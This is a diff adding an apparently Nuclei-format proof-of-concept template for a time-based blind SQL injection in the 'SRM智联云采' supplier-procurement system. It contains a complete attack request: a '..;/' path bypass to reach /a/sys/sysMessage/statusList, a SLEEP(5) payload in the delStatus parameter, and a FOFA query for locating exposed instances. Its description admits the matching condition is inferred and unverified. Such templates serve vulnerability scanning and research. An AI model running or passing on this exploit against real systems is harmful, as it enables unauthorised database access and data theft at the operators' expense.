@@ -1,0 +1,40 @@
+id: poc-psogbn69tm0uocv3
+info:
+  name: SRM智联云采系统statusList存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/psogbn69tm0uocv3
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: psogbn69tm0uocv3
+    fofa: title=="SRM 2.0"
+http:
+- raw:
+  - 'GET /adpweb/static/..;/a/sys/sysMessage/statusList?companyName=1&officeName=1&orderBy=1&receiverName=1&sourceMessageId=1&delStatus=11%20AND%20(SELECT%20777%20FROM%20(SELECT(SLEEP(5)))AZX) HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: zhilink.session.id=634a563e38864f49a62cbaac4ebbe419; JSESSIONID=AA0ABCE37B1339584C058F685644D04B; Hm_lvt_82116c626a8d504a5c0675073362ef6f=1732077012; Hm_lpvt_82116c626a8d504a5c0675073362ef6f=1732077012; HMACCOUNT=F3A0D49D22D0A4BB
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
